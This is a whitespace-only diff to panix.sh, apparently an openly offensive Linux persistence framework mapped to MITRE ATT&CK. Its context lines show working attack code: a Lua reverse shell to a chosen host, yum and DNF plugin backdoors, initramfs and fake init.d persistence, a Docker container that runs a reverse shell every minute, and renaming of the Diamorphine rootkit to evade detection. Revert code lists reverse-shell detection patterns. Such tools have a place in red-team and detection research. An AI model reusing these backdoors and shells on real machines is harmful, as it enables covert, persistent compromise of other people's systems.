@@ -92,7 +92,7 @@ usage_root() {
 # All revert functions
 revert_all() {
 	echo "[+] Reverting all modules..."
-	
+
 	local modules=(
 		revert_at
 		revert_authorized_keys
@@ -954,7 +954,7 @@ setup_bind_shell() {
 					echo "[-] Node.js is not available on this system. Cannot use Node.js for bind shell."
 				fi
 			fi
-			
+
 			# Ref: https://gtfobins.github.io/gtfobins/socat/#bind-shell
 			if [[ $socat -eq 1 ]]; then
 				echo "[+] Checking for Socat on the system..."
@@ -2617,7 +2617,7 @@ setup_initd_backdoor() {
 		# Required-Start:       \$remote_fs \$syslog \$network
 		# Required-Stop:        \$remote_fs \$syslog
 		# Default-Start:        2 3 4 5
-		# Default-Stop:        
+		# Default-Stop:
 		# Short-Description:    OpenBSD Secure Shell server
 		### END INIT INFO
 
@@ -2895,7 +2895,7 @@ setup_initramfs() {
 
 		echo "[!] Preparing Dracut-based initramfs persistence..."
 		mkdir -p /usr/lib/dracut/modules.d/99panix || { echo "Error: Could not create /usr/lib/dracut/modules.d/99panix"; exit 1; }
-		
+
 		# Create a simple module setup script that uses a single hook.
 		cat <<'EOF' > /usr/lib/dracut/modules.d/99panix/module-setup.sh
 #!/bin/bash
@@ -3000,7 +3000,7 @@ EOF
 		dd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2>/dev/null || { echo "Error: dd failed (begin)"; exit 1; }
 
 		unmkinitramfs initrd.img initrd_extracted || { echo "Error: unmkinitramfs failed"; exit 1; }
-		
+
 		INIT_FILE="initrd_extracted/main/init"
 		if [[ ! -f "$INIT_FILE" ]]; then
 			echo "Error: Could not find initramfs main/init file."
@@ -3727,7 +3727,7 @@ setup_malicious_docker_container() {
 	echo "[+] Malicious Docker container created and running."
 	echo "[+] Reverse shell is executed every minute."
 	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
-	echo "[+] Docker container persistence established!" 
+	echo "[+] Docker container persistence established!"
 }
 
 # Revert Module: revert_malicious_docker_container.sh
@@ -4196,7 +4196,7 @@ revert_motd() {
 		local script_path="$1"
 		# Define patterns that indicate a reverse shell
 		local patterns=("bash -i >& /dev/tcp" "nohup setsid /bin/sh " "bash -c 'sh -i" "setsid nohup")
-		
+
 		for pattern in "${patterns[@]}"; do
 			if grep -q "$pattern" "$script_path"; then
 				echo "[+] Identified malicious MOTD script: $script_path"
@@ -4209,7 +4209,7 @@ revert_motd() {
 	# Remove default MOTD backdoor script
 	default_motd_path="/etc/update-motd.d/137-python-upgrades"
 	echo "[+] Removing default MOTD backdoor script..."
-	
+
 	if [[ -f "$default_motd_path" ]]; then
 		remove_motd_script "$default_motd_path"
 	fi
@@ -4590,7 +4590,7 @@ setup_package_manager_persistence() {
 			chmod +x /usr/lib/yumcon
 
 			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
-			
+
 			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
 			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py
 
@@ -4613,7 +4613,7 @@ setup_package_manager_persistence() {
 			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
 			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
 			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
-			
+
 			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf
 
 			echo "[+] DNF persistence established"
@@ -5119,8 +5119,8 @@ revert_pam() {
 			"/usr/lib/x86_64-linux-gnu/security/pam_unix.so"
 			"/lib64/security/pam_unix.so"
 		)
-		
-		# Revert pam_unix.so with the pam_unix.so.bak backup 
+
+		# Revert pam_unix.so with the pam_unix.so.bak backup
 		for pam_module in "${pam_module_paths[@]}"; do
 			if [[ -f "$pam_module.bak" ]]; then
 				mv -f "$pam_module.bak" "$pam_module"
@@ -5283,7 +5283,7 @@ setup_passwd_user() {
 				usage_passwd_user
 				exit 0
 				;;
-		
+
 			* )
 				echo "Invalid option for --passwd-user: $1"
 				echo "Try './panix.sh --passwd-user --help' for more information."
@@ -5788,7 +5788,7 @@ setup_rc_local_backdoor() {
 			echo "$command" >> $rc_local_path
 		fi
 	fi
-	
+
 	if [ -f /etc/rc.d/rc.local ]; then
 		chmod +x /etc/rc.d/rc.local
 	fi
@@ -6039,7 +6039,7 @@ setup_reverse_shell() {
 			echo "[!] Checking for Lua..."
 			if command -v lua &>/dev/null; then
 				echo "[+] Lua is installed. Checking for LuaSocket..."
-				
+
 				if lua -e 'require("socket")' &>/dev/null; then
 					payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
 					echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
@@ -6454,7 +6454,7 @@ setup_rootkit() {
 	# Files
 	mv ${rk_path}/diamorphine.c ${rk_path}/${identifier}.c
 	mv ${rk_path}/diamorphine.h ${rk_path}/${identifier}.h
-	
+
 	# Module Information
 	sed -i s/m0nad/${identifier}/g ${rk_path}/${identifier}.c
 	sed -i -E "s/(MODULE_DESCRIPTION\\(\")[^\"]*(\"\\);)/\1${identifier}\2/" "${rk_path}/${identifier}.c"
@@ -6466,12 +6466,12 @@ setup_rootkit() {
 	sed -i s/diamorphine_init/${identifier}_init/g ${rk_path}/${identifier}.c
 	sed -i s/diamorphine_cleanup/${identifier}_cleanup/g ${rk_path}/${identifier}.c
 	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
-	
+
 	# Original functions
 	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
 	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
 	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
-	
+
 	# Hooks
 	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
 	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
@@ -9062,7 +9062,7 @@ display_mitre_matrix() {
 		"--udev" "Event Triggered Execution" "T1546" "Udev Rules" "T1546.017" "https://attack.mitre.org/techniques/T1546/017" \
 		"--web-shell" "Server Software Component" "T1505" "Web Shell" "T1505.003" "https://attack.mitre.org/techniques/T1505/003" \
 		"--xdg" "Boot or Logon Autostart Execution" "T1547" "XDG Autostart Entries" "T1547.013" "https://attack.mitre.org/techniques/T1547/013"
-	
+
 	echo -e "\n\033[1;32mLegend:\033[0m"
 	echo "Technique: High-level MITRE ATT&CK technique."
 	echo "Sub-Technique: Specific sub-technique under a high-level technique."
